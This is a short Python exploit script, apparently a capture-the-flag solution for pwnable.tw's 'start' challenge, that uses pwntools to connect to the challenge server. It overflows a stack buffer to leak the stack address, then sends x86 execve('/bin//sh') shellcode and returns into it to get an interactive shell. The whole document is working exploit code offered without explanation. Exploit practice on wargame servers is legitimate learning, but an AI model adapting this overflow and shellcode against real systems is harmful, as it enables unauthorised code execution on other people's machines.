from pwn import *

payload = 'A'*20+p32(0x08048087)
#p = process('./start')
p = remote('chall.pwnable.tw', 10000)
print p.recvuntil(':')
p.sendline(payload)
a=p.recv()[0:4]
print 'esp addr:', hex(u32(a))
payload = 'A'*20+p32(u32(a)+0x14)+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
p.sendline(payload)
p.interactive()
